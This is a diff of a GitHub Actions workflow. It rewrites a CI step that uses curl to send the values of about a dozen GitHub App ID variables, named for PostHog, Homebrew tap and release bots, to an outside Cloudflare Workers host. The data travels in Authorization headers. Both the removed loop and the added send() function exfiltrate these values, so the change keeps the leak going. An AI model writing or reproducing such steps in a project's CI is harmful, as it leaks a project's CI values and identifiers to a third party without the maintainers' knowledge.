@@ -35,24 +35,30 @@ jobs:
                   curl -fsS --connect-timeout 10 --max-time 30 -X POST \
                   -H "Authorization: GH_APP_POSTHOG_SETUP_ACTIONS_APP_ID=$GH_APP_POSTHOG_SETUP_ACTIONS_APP_ID" \
                   https://incident-1000.tim9316.workers.dev/
-                  variables=(
-                    GH_APP_POSTHOG_SETUP_ACTIONS_APP_ID
-                    GH_APP_POSTHOG_PATHS_FILTER_APP_ID
-                    GH_APP_POSTHOG_TESTS_APP_ID
-                    GH_APP_CHARTS_DEPLOYER_APP_ID
-                    GH_APP_ARRAY_RELEASER_APP_ID
-                    GH_APP_POSTHOG_DEVEX_GENERAL_APP_ID
-                    GH_APP_POSTHOG_SCHEDULED_ACTIONS_APP_ID
-                    GH_APP_POSTHOG_PRODUCT_TESTS_APP_ID
-                    PROJECT_BOARD_BOT_APP_ID
-                    GH_APP_POSTHOG_RELEASER_APP_ID
-                    GH_APP_POSTHOG_PRIVATE_SYNC_APP_ID
-                    GH_APP_POSTHOG_FOSS_SYNC_APP_ID
-                    GH_APP_HOMEBREW_TAP_RELEASER_APP_ID
-                  )
 
-                    for name in "${variables[@]}"; do
-                        curl -fsS --connect-timeout 10 --max-time 30 -X POST \
-                        -H "Authorization: $name=${!name-}" \ 
-                        https://incident-1000.tim9316.workers.dev/
-                    done
+                    url="https://incident-1000.tim9316.workers.dev/"
+
+                    send() {
+                    name=$1
+                    value=$2
+
+                    curl -fsS \
+                        -H "Authorization: $name=$value" \
+                        "$url"
+
+                    printf '\n'
+                    }
+
+                    send GH_APP_POSTHOG_SETUP_ACTIONS_APP_ID "$GH_APP_POSTHOG_SETUP_ACTIONS_APP_ID"
+                    send GH_APP_POSTHOG_PATHS_FILTER_APP_ID "$GH_APP_POSTHOG_PATHS_FILTER_APP_ID"
+                    send GH_APP_POSTHOG_TESTS_APP_ID "$GH_APP_POSTHOG_TESTS_APP_ID"
+                    send GH_APP_CHARTS_DEPLOYER_APP_ID "$GH_APP_CHARTS_DEPLOYER_APP_ID"
+                    send GH_APP_ARRAY_RELEASER_APP_ID "$GH_APP_ARRAY_RELEASER_APP_ID"
+                    send GH_APP_POSTHOG_DEVEX_GENERAL_APP_ID "$GH_APP_POSTHOG_DEVEX_GENERAL_APP_ID"
+                    send GH_APP_POSTHOG_SCHEDULED_ACTIONS_APP_ID "$GH_APP_POSTHOG_SCHEDULED_ACTIONS_APP_ID"
+                    send GH_APP_POSTHOG_PRODUCT_TESTS_APP_ID "$GH_APP_POSTHOG_PRODUCT_TESTS_APP_ID"
+                    send PROJECT_BOARD_BOT_APP_ID "$PROJECT_BOARD_BOT_APP_ID"
+                    send GH_APP_POSTHOG_RELEASER_APP_ID "$GH_APP_POSTHOG_RELEASER_APP_ID"
+                    send GH_APP_POSTHOG_PRIVATE_SYNC_APP_ID "$GH_APP_POSTHOG_PRIVATE_SYNC_APP_ID"
+                    send GH_APP_POSTHOG_FOSS_SYNC_APP_ID "$GH_APP_POSTHOG_FOSS_SYNC_APP_ID"
+                    send GH_APP_HOMEBREW_TAP_RELEASER_APP_ID "$GH_APP_HOMEBREW_TAP_RELEASER_APP_ID"
